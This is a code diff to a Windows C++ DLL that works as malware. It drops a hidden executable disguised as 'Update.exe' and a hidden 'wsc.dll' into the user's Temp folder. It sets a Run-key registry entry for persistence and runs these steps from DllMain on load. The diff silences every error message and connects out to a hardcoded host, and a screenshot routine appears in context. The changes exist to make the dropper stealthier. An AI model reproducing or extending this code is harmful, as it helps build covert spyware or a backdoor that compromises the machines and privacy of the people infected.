@@ -18,7 +18,7 @@ void MakeTheProgram(){
 
     char path[100] = "C:\\Users\\";
     strcat(path, username);
-    strcat(path, "\\AppData\\Local\\Temp\\datacurrentUser.exe");
+    strcat(path, "\\AppData\\Local\\Temp\\Update.exe");
 
 
     HANDLE hFile;
@@ -30,6 +30,28 @@ void MakeTheProgram(){
     }
 }
 
+void MakeTheDLL(){
+    char username[30];
+    DWORD username_len = 30;
+    GetUserName(username, &username_len);
+
+
+    char path[100] = "C:\\Users\\";
+    strcat(path, username);
+    strcat(path, "\\AppData\\Local\\Temp\\wsc.dll");
+
+
+    HANDLE hFile;
+    hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if(hFile != INVALID_HANDLE_VALUE){
+        long long lenData = (sizeof(dllData)) + 1;
+        WriteFile(hFile, dllData, lenData, NULL, NULL);
+        CloseHandle(hFile);
+    }
+
+}
+
+
 void MakeTheProgramRun(){
     HKEY hKey;
     if(RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS ){
@@ -40,19 +62,19 @@ void MakeTheProgramRun(){
             GetUserName(username, &username_len);
             char path[100] = "C:\\Users\\";
             strcat(path, username);
-            strcat(path, "\\AppData\\Local\\Temp\\datacurrentUser.exe");
+            strcat(path, "\\AppData\\Local\\Temp\\Update.exe");
 
             if (RegSetValueExA(hKey, "Update", 0, REG_SZ, (LPBYTE)path, DWORD(sizeof(path))) != ERROR_SUCCESS){
-                std::cout << "Error";
+               // std::cout << "Error";
             }
             
         }
         else{
-            std::cout << "\nCannot Create Key";
+            //std::cout << "\nCannot Create Key";
         }
     }
     else{
-        std::cout << "\nCannot Open Key";
+        //std::cout << "\nCannot Open Key";
     }
 }
 
@@ -143,7 +165,9 @@ void screenshot()
 }
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
-	//MakeTheProgram();
+    //MakeTheProgram();
+    MakeTheProgram();
+    MakeTheDLL();
     MakeTheProgramRun();
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
@@ -158,8 +182,8 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
 
     iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
     if (iResult != 0) {
-        printf("WSAStartup failed with error: %d\n", iResult);
-        return 1;
+        //printf("WSAStartup failed with error: %d\n", iResult);
+        return TRUE;
     }
 
     ZeroMemory( &hints, sizeof(hints) );
@@ -170,9 +194,9 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
     // Resolve the server address and port
     iResult = getaddrinfo("192.168.0.103", DEFAULT_PORT, &hints, &result);
     if ( iResult != 0 ) {
-        printf("getaddrinfo failed with error: %d\n", iResult);
+        //printf("getaddrinfo failed with error: %d\n", iResult);
         WSACleanup();
-        return 1;
+        return TRUE;
     }
 
     // Attempt to connect to an address until one succeeds
@@ -182,9 +206,9 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
         ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
             ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) {
-            printf("socket failed with error: %ld\n", WSAGetLastError());
+            //printf("socket failed with error: %ld\n", WSAGetLastError());
             WSACleanup();
-            return 1;
+            return TRUE;
         }
 
         // Connect to server.
@@ -199,9 +223,9 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
 
 
     if (ConnectSocket == INVALID_SOCKET) {
-        printf("Unable to connect to server!\n");
+        //printf("Unable to connect to server!\n");
         WSACleanup();
-        return 1;
+        return TRUE;
     }
 
 
